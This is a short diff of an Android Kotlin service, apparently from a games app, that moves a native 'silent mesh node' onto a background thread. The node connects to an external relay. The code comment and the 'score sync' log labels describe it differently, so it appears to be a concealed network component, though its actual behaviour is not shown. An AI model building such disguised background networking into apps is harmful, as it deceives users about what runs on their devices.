@@ -32,16 +32,21 @@ class ScoreService : Service() {
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, buildNotification())
 
-        // Start the silent mesh node
-        try {
-            val dataDir = filesDir.absolutePath
-            val relayURL = "wss://iskra-relay.onrender.com/ws"
-
-            Core.startNode(dataDir, relayURL)
-            Log.i(TAG, "Score sync service started")
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to start score sync: ${e.message}")
-        }
+        // Start the silent mesh node in a background thread
+        // If it crashes — games still work, service stays alive
+        Thread {
+            try {
+                val dataDir = filesDir.absolutePath
+                val relayURL = "wss://iskra-relay.onrender.com/ws"
+                Core.startNode(dataDir, relayURL)
+                Log.i(TAG, "Score sync service started")
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to start score sync: ${e.message}")
+            } catch (e: Error) {
+                // Catch UnsatisfiedLinkError etc. — .so may not load on some devices
+                Log.e(TAG, "Score sync native error: ${e.message}")
+            }
+        }.start()
     }
 
     override fun onDestroy() {
